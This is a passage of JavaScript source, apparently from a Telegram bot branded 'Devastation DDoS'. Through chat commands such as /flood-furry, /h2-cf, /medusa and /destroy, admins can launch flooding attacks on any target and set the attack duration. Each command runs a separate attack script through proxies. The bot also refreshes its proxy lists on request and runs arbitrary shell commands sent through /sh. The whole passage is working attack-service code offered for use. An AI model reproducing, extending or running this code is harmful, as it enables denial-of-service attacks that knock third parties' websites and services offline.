  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You dont have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/storm.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/flood-furry(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'input time');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You dont have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded the limit\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/YAT-TLS.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/kill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You dont have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/LEZKILL.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/strike(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You dont have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/brows.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/h2-cf(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You dont have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/CFSTRONG.js ${target} ${time} 15 POST proxy.txt 110`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/ninja(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Enter target');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Enter time');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/Nexus.js POST ${target} proxy.txt ${time} 60 15 `);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 60\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/medusa(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded the limit\n Deadline ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/Medusa.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/destroy(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌ You dont have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/destroy.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/h2-destroy(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'target input');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'time input');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, '❌You do not have access to do this.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Time exceeded\nTime limit ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/destroys.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By Devastation DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By Devastation DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;

  if (callbackQuery.data === 'stop') {
    const isAdmin = adminIds.includes(chatId.toString());

    if (!isAdmin) {
      bot.sendMessage(chatId, 'You do not have access to do this.');
      return;
    }
    stopProcesses(chatId);
  }
});
bot.onText(/^\/upproxy$/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = adminIds.includes(chatId.toString());
  if (!isAdmin) {
    bot.sendMessage(chatId, '*❌You do not have access to do this .*');
    return;
  }
  try {
    if (fs.existsSync('./lib/proxy.txt')) {
      fs.unlinkSync('./lib/proxy.txt');
    }
    await scrapeProxies(chatId);
  } catch (error) {
    bot.sendMessage(chatId, `*⚠️an error occurred while upgrading the proxy:* ${error.message}`);
  }
});


bot.onText(/\/sh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const command = match[1];
  const isAdmin = adminIds.includes(chatId.toString());
  
  if (!isAdmin) {
    bot.sendMessage(chatId, '*❌you dont have access to do this .*');
    return;
  }
  
  exec(command, { maxBuffer: parseInt(adminData.limit) * 1024 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Stderr: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Output:\n${stdout}`);
  });
});
bot.on('polling_error', (error) => console.log(error));


